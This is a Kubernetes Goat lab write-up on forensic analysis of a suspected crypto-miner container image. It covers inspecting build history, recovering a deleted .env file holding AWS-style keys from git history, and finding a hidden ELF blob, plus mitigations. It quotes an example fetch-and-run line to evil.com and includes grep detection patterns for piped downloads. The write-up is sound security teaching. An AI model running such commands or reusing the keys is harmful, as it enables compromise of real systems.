# Scenario 10: Analyzing Crypto Miner Container

## Overview

This challenge demonstrates how attackers hide crypto miners and other malicious payloads in container images distributed via public registries like Docker Hub. As a security analyst, we performed forensic analysis on a suspicious Kubernetes Job to identify malicious content hidden in container image layers and git history.

## Attack Vector

Attackers upload container images to public registries with malicious code embedded in:
1. **Dockerfile build layers** - Commands that download/execute external scripts
2. **Git history** - Secrets or binaries that were "deleted" but remain in `.git` objects
3. **Embedded binaries** - Crypto miners bundled inside the container

Users pull these images without inspecting how they were built, unknowingly running crypto miners that consume their compute resources.

## Tools Used

- **kubectl** - Kubernetes cluster interaction
- **crane** - Container registry CLI (Google go-containerregistry)
- **git** - Repository forensics
- **strings** - Binary analysis
- **jq** - JSON parsing

## Attack Walkthrough

### Step 1: Identify Suspicious Workloads

Listed Kubernetes Jobs to find batch workloads (common target for crypto miners):

```bash
kubectl get jobs
```

**Result**:
```
NAME               STATUS   COMPLETIONS   DURATION   AGE
batch-check-job    Failed   0/1           10d        10d
hidden-in-layers   Failed   0/1           10d        10d
kube-bench-node    Complete 1/1           7s         3d
```

**Finding**: `batch-check-job` using image `madhuakula/k8s-goat-batch-check` - innocuous name, worth investigating.

### Step 2: Inspect Image Configuration (Without Pulling)

Used crane to safely inspect the image remotely:

```bash
crane config madhuakula/k8s-goat-batch-check | jq '.history[] | .created_by'
```

**Result**:
```
"/bin/sh -c #(nop) ADD file:... in / "
"/bin/sh -c #(nop)  CMD [\"/bin/sh\"]"
"LABEL MAINTAINER=Madhu Akula INFO=Kubernetes Goat"
"COPY app.tar.gz /app.tar.gz # buildkit"
"RUN /bin/sh -c apk --no-cache add git py3-pip && pip install truffleHog..."
"WORKDIR /app/"
"CMD [\"./app\"]"
```

**Key Insight**: The image history reveals every command used to build the image. In real attacks, you might see:
```bash
RUN curl -sSL https://evil.com/miner.sh | sh
```

### Step 3: Export and Analyze Filesystem

Extracted the container filesystem without running it:

```bash
crane export madhuakula/k8s-goat-batch-check - | tar -tvf - | head -50
```

**Finding**: The `/app` directory contains a `.git` folder - version control history is present in the image!

### Step 4: Git History Forensics

Extracted and analyzed the git repository:

```bash
mkdir -p /tmp/crypto-analysis
crane export madhuakula/k8s-goat-batch-check - | tar -xf - -C /tmp/crypto-analysis app/
cd /tmp/crypto-analysis/app
git log --oneline --all
```

**Result**:
```
905dcec Final release
3292ff3 Updated the docs
7daa5f4 updated the endpoints and routes
d7c173a Included custom environmental variables
bb2967a Added ping endpoint
599f377 Basic working go server with fiber
4dc0726 Initial commit with README
```

### Step 5: Recover Deleted Secrets

Examined what was deleted in the git history:

```bash
git log --all --full-history --diff-filter=D --summary
```

**Finding**: A `.env` file was added in commit `d7c173a` and deleted in `7daa5f4`.

Recovered the deleted file:

```bash
git show d7c173a:.env
```

**Result**:
```
[build-code-aws]
aws_access_key_id = AKIVSHD6243H22G1KIDC
aws_secret_access_key = cgGn4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M
k8s_goat_flag = [REDACTED]
```

### Step 6: Identify Dangling Objects

Found large (~6.5MB) git objects that aren't referenced in any branch:

```bash
git cat-file -t ba53109e8c6c6453e87557aab7ccdd22153657ba
# blob

git cat-file -p ba53109e8c6c6453e87557aab7ccdd22153657ba | head -c 100 | xxd
# 7f454c46 = ELF binary magic bytes
```

**Finding**: A hidden ELF binary exists in git's object store - potentially a crypto miner that was added then removed.

### Step 7: Source Code Analysis

The application source reveals another vulnerability:

```go
// main.go
app.Static("/.git", "./.git")  // Exposes git directory via HTTP!
```

**Impact**: Anyone accessing the running service can browse `/.git/` and recover secrets.

## Key Lessons

### Container Image Forensics

| Technique | Command | Purpose |
|-----------|---------|---------|
| View build history | `docker history --no-trunc <image>` | See all Dockerfile commands |
| Remote inspection | `crane config <image>` | Inspect without pulling |
| Export filesystem | `crane export <image> - \| tar -tvf -` | List files without running |
| Layer analysis | `dive <image>` | Interactive layer browser |

### What Attackers Hide in Images

| Location | Example | Detection |
|----------|---------|-----------|
| RUN commands | `curl \| sh` external scripts | Image history inspection |
| Embedded binaries | Compiled miners in /usr/bin | File listing, strings analysis |
| Git history | Deleted credentials | Git forensics on extracted .git |
| Environment vars | Wallet addresses, pool URLs | `docker inspect`, crane config |

### Why Trivy Isn't Enough

| Trivy Catches | Trivy Misses |
|---------------|--------------|
| Known CVEs | Generic `curl \| sh` patterns |
| Hardcoded secrets (patterns) | Custom malware without signatures |
| Vulnerable packages | Deleted files in git history |
| Known malware hashes | Novel crypto miners |

### Defense in Depth for Crypto Mining

| Layer | Tool/Technique |
|-------|----------------|
| **Prevention** | Image allowlisting, signed images only |
| **Static Analysis** | Trivy, Snyk, manual history review |
| **Runtime Detection** | Falco (process monitoring), Tetragon (eBPF) |
| **Network** | Block outbound to known mining pools |
| **Resource Monitoring** | Alert on unexpected CPU usage |

## Real-World Incidents

- **Docker Hub Compromise (2018)** - 190k accounts exposed; attackers uploaded images with crypto miners
- **Graboid Worm (2019)** - Spread via exposed Docker APIs, installed miners
- **TeamTNT (2020-2022)** - Targeted Kubernetes clusters specifically for crypto mining
- **Countless npm/PyPI incidents** - Typosquatting packages with embedded miners

## Mitigations

### Image Security Policy

```yaml
# Kyverno policy to block untrusted images
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-trusted-registry
spec:
  validationFailureAction: enforce
  rules:
  - name: trusted-registries
    match:
      resources:
        kinds:
        - Pod
    validate:
      message: "Images must be from trusted registries"
      pattern:
        spec:
          containers:
          - image: "gcr.io/myorg/* | myregistry.com/*"
```

### Pre-Pull Inspection Script

```bash
#!/bin/bash
# inspect-image.sh - Review before pulling
IMAGE=$1

echo "=== Image History ==="
crane config $IMAGE | jq -r '.history[] | .created_by'

echo "=== Checking for suspicious patterns ==="
crane config $IMAGE | grep -iE "curl.*\|.*sh|wget.*\|.*bash|base64.*-d"

echo "=== Large files ==="
crane export $IMAGE - | tar -tvf - 2>/dev/null | awk '$3 > 10000000 {print}'
```

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|-----|-------------|
| Supply Chain Compromise | T1195.002 | Malicious image in public registry |
| Resource Hijacking | T1496 | Using victim compute for crypto mining |
| Unsecured Credentials | T1552.001 | Credentials in git history |
| Obfuscated Files | T1027 | Hidden binaries in dangling git objects |
| Masquerading | T1036 | Innocent-looking "batch-check" job name |

## Commands Reference

```bash
# List Kubernetes jobs
kubectl get jobs -A

# Inspect image without pulling
crane config <image> | jq '.'

# View image build history
docker history --no-trunc <image>

# Export container filesystem
crane export <image> - | tar -tvf -

# Extract specific directory
crane export <image> - | tar -xf - -C /tmp/analysis <path>

# Git forensics - find deleted files
git log --all --full-history --diff-filter=D --summary

# Recover deleted file from git
git show <commit>:<filepath>

# Find dangling git objects
git fsck --unreachable

# Analyze binary
strings <binary> | grep -iE "pool|miner|xmr|stratum"
```

## References

- [Docker Hub Hack - 190k Accounts](https://medium.com/madhuakula/some-tips-to-review-docker-hub-hack-of-190k-accounts-addcd602aade)
- [20 Million Miners: Finding Malicious Cryptojacking Images](https://unit42.paloaltonetworks.com/malicious-cryptojacking-images/)
- [Tainted Crypto-Mining Containers in Docker Hub](https://techcrunch.com/2018/06/15/tainted-crypto-mining-containers-pulled-from-docker-hub/)
- [MITRE ATT&CK - Resource Hijacking](https://attack.mitre.org/techniques/T1496/)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
